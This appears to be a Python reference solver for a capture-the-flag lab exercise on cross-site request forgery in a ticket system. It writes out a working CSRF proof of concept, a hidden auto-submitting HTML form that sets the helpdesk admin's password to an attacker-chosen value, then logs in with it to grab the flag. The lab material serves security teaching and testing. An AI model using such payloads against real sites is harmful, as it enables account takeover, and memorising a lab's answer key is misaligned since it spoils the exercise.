#!/usr/bin/env python3
"""Masquerade Operation 03 reference solver -- Ying detonates a password reset D. Cho
never asked for.

WSTG-SESS-05: Testing for Cross Site Request Forgery. The ticket system's password-change
handler checks exactly one thing: is *someone* logged in. It never checks whether that
someone meant to submit this specific request -- no per-request token, nothing tying the
request to a page the user actually clicked "submit" on. D. Cho, the helpdesk admin, keeps
the ticket system open all shift. A page that auto-submits a hidden form the instant it
loads needs nothing from D. Cho except one click on whatever link opens it.

This script builds a real PoC -- the same shape a browser would actually need -- and hands
it to the app's delivery simulation, which parses it exactly like a browser would (no
execution) and, if it's genuine, plays D. Cho's part: opens it, the form fires, the
password changes.

Usage: python3 solver.py [base_url]     (default http://localhost:8000)
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
AGENT_USER = "support.agent"
AGENT_PASSWORD = "Ticket2024!"
ADMIN_USER = "d.cho"


def build_poc(new_password, vuln_path="/masquerade/op3/ticket/?p=process_change_password&id=1"):
    """A real CSRF PoC: a hidden auto-submitting form, same shape a real attacker page
    would use. This is genuine HTML the app's parser reads -- nothing here is faked or
    special-cased for the solver."""
    return f"""<html><body>
<form action="{vuln_path}" method="POST" id="csrf" name="csrf">
  <input type="hidden" name="new_password" value="{new_password}" />
  <input type="hidden" name="confirm_password" value="{new_password}" />
  <input type="hidden" name="submit" value="Change Password" />
</form>
<script>document.csrf.submit();</script>
</body></html>"""


def main():
    print(f"[*] Baseline -- signing in as the ordinary test account ({AGENT_USER})")
    s = requests.Session()
    s.post(f"{BASE}/masquerade/op3/login", data={"username": AGENT_USER, "password": AGENT_PASSWORD})
    r = s.get(f"{BASE}/masquerade/op3/dashboard")
    print(f"    ticket queue reachable: {r.status_code == 200}, flag present: {'R6S{' in r.text} (expected: False)")

    chosen_password = "PwnedByYing123!"
    print(f"\n[*] Crafting a real CSRF PoC -- hidden auto-submit form, password we choose: {chosen_password!r}")
    poc_html = build_poc(chosen_password)
    print("    (this is genuine HTML -- the app parses it, never trusts a pre-baked answer)")

    print(f"\n[*] Delivering the page -- {ADMIN_USER} is modeled as opening it and the form firing itself")
    r2 = requests.post(f"{BASE}/masquerade/op3/host-poc", data={"poc": poc_html})
    delivered = r2.status_code == 200 and "delivered" in r2.text.lower()
    print(f"    delivered: {delivered}")

    print(f"\n[*] Signing in as {ADMIN_USER}, using ONLY the password we chose -- never the real one")
    s2 = requests.Session()
    s2.post(f"{BASE}/masquerade/op3/login", data={"username": ADMIN_USER, "password": chosen_password})
    r3 = s2.get(f"{BASE}/masquerade/op3/dashboard")
    flag = re.search(r"R6S\{[^}]*\}", r3.text)
    if flag:
        print(f"[+] {flag.group(0)}")
    else:
        print(f"[!] login as {ADMIN_USER} failed (HTTP {r3.status_code}) -- PoC may not have been accepted")

    print("\n[*] Sanity check -- a PoC missing the auto-submit script must be rejected")
    inert_poc = build_poc("ShouldNeverWork1!").replace(
        "<script>document.csrf.submit();</script>", "")
    r4 = requests.post(f"{BASE}/masquerade/op3/host-poc", data={"poc": inert_poc})
    print(f"    rejected (HTTP {r4.status_code} != 200): {r4.status_code != 200} (expected: True)")

    print("\n[*] Sanity check -- a PoC targeting the wrong endpoint must be rejected")
    wrong_poc = build_poc("ShouldNeverWork2!", vuln_path="/masquerade/op3/not-the-real-endpoint")
    r5 = requests.post(f"{BASE}/masquerade/op3/host-poc", data={"poc": wrong_poc})
    print(f"    rejected (HTTP {r5.status_code} != 200): {r5.status_code != 200} (expected: True)")


if __name__ == "__main__":
    main()
